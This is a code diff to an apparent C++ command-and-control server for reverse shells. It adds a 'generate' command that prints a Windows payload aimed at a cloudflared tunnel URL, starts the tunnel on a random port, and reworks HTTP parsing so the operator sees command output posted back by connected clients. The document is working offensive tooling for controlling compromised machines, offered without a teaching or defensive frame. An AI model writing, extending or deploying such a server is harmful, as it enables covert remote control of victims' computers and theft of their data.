@@ -13,21 +13,23 @@
 #include <vector>
 #include <sstream>
 #include "command.cpp"
+#include "PayloadGenerator.cpp"
 #include <regex>
 #include <cctype>
+#include<random>
 
 using namespace std;
 
-const int PORT = 8080;
-const int BUFFER_SIZE = 1024;
+int PORT;
+int BUFFER_SIZE = 1000000;
 
 unordered_map<string, int> mp;
 string user_input;
 int client_id = 0;
-
+string cloudflared_url;
 void serve_client(string endpoint, int server_fd);
 void help();
-string start_cloudflared();
+
 
 string get_endpoint(const char* buffer) {
     string request_line(buffer);
@@ -80,10 +82,31 @@ void shell(unordered_map<string, int>& mp, int server_fd) {
             } else {
                 cout << "\n[-] Client ID not found.\n\n";
             }
-        } else {
+        } 
+        else if (se.find("generate")!=se.end()){
+            if(se.find("os=windows")!=se.end()){
+                string payload=payload_generator_windows(cloudflared_url);
+                cout<<payload<<endl;
+            }
+            else if(se.find("os=linux")!=se.end()){
+                string payload="";
+                cout<<payload<<endl;
+            }
+            else{
+                cout<<"Os does not found."<<endl;
+            }
+        } 
+
+        else if(se.find("quit")!=se.end() and !se.empty()){
+            string command="sudo kill $(sudo lsof -ti :"+to_string(PORT)+") 2>&1 &";
+            system(command.c_str());
+            break;
+        }
+        else {
             cout << "\n[-] Unknown command. Type 'help' to see available commands.\n\n";
         }
     }
+    return;
 }
 
 void client_connect(int server_fd) {
@@ -156,14 +179,14 @@ void serve_client(string endpoint, int server_fd) {
     bool flag = true;
 
     cout << "\n[+] Entering remote shell with client '" << endpoint << "'\n";
-    cout << "    Type 'exit' to return to MainShell.\n\n";
+    cout << "    Type 'quit' to return to MainShell.\n\n";
 
     auto input_func = [&]() {
         cout << "(Shell@" << endpoint << ") > ";
         while (flag) {
             getline(cin >> ws, user_input);
 
-            if (user_input == "exit") {
+            if (user_input == "quit") {
                 flag = false;
             }
         }
@@ -173,7 +196,45 @@ void serve_client(string endpoint, int server_fd) {
 
     while (true) {
         string full_request;
-        while (true) {
+
+        // Step 1: Read until \r\n\r\n --> get full headers first
+        while (full_request.find("\r\n\r\n") == string::npos) {
+            char buffer[BUFFER_SIZE] = {0};
+            ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);
+          
+
+            if (valread <= 0) {
+                break;
+            }
+
+            full_request += string(buffer, valread);
+        }
+
+        if (full_request.empty()) {
+            continue;
+        }
+
+        // Step 2: Parse Content-Length
+        size_t content_length_pos = full_request.find("Content-Length:");
+        size_t body_start_pos = full_request.find("\r\n\r\n");
+
+        int content_length = 0;
+        if (content_length_pos != string::npos && body_start_pos != string::npos) {
+            size_t start = content_length_pos + strlen("Content-Length:");
+            size_t end = full_request.find("\r\n", start);
+            string length_str = full_request.substr(start, end - start);
+
+            try {
+                content_length = stoi(length_str);
+            } catch (...) {
+                content_length = 0;
+            }
+        }
+
+        // Step 3: Read body fully
+        string body_data = full_request.substr(body_start_pos + 4);  // Skip \r\n\r\n
+
+        while ((int)body_data.length() < content_length) {
             char buffer[BUFFER_SIZE] = {0};
             ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);
 
@@ -181,24 +242,22 @@ void serve_client(string endpoint, int server_fd) {
                 break;
             }
 
-            full_request += string(buffer, valread);
+            body_data += string(buffer, valread);
+        }
 
-            if (full_request.find("\r\n\r\n") != string::npos) {
-                break;
+        // Step 4: Decode and display result if POST
+        if (full_request.find("POST") != string::npos) {
+            string result = url_decode(body_data);
+
+            if (result.size() > 3) {
+                result.resize(result.size() - 3);
+                cout << result << "\n(Shell@" << endpoint << ") > " << flush;
+            } else {
+                cout << result << "\n(Shell@" << endpoint << ") > " << flush;
             }
         }
 
-        string result = url_decode(full_request);
-
-        if (full_request.empty()) {
-            continue;
-        }
-
-        if (result.size() > 3) {
-            result.resize(result.size() - 3);
-            cout << result << "\n(Shell@" << endpoint << ") > " << flush;
-        }
-
+        // Step 5: Send response (command)
         string body = user_input;
         string response = "HTTP/1.1 200 OK\r\n"
                           "Content-Type: text/plain\r\n"
@@ -218,6 +277,7 @@ void serve_client(string endpoint, int server_fd) {
 }
 
 void server() {
+
     int server_fd;
     struct sockaddr_in address, client_addr;
     socklen_t addrlen = sizeof(client_addr);
@@ -253,13 +313,22 @@ void server() {
 }
 
 int main() {
+    
     banner();
-    // string cloudflared_url = start_cloudflared();
-    // if (cloudflared_url.size() <= 0) {
-    //     cout << "Failed to create tunnel";
-    //     return 0;
-    // }
-    // cout << "Tunnel created successfully" << endl;
+    random_device rd;  
+    mt19937 gen(rd()); 
+    uniform_int_distribution<> dis(1000, 10000);
+    
+    PORT = dis(gen);
+
+    cloudflared_url = start_cloudflared(PORT);
+    if (cloudflared_url.size() <= 0) {
+        cout << "Failed to create tunnel";
+        cloudflared_url="http://127.0.0.1:"+to_string(PORT);
+    }
+    else{
+        cout << "Tunnel created successfully" << endl;
+    }
     server();
     return 0;
 }
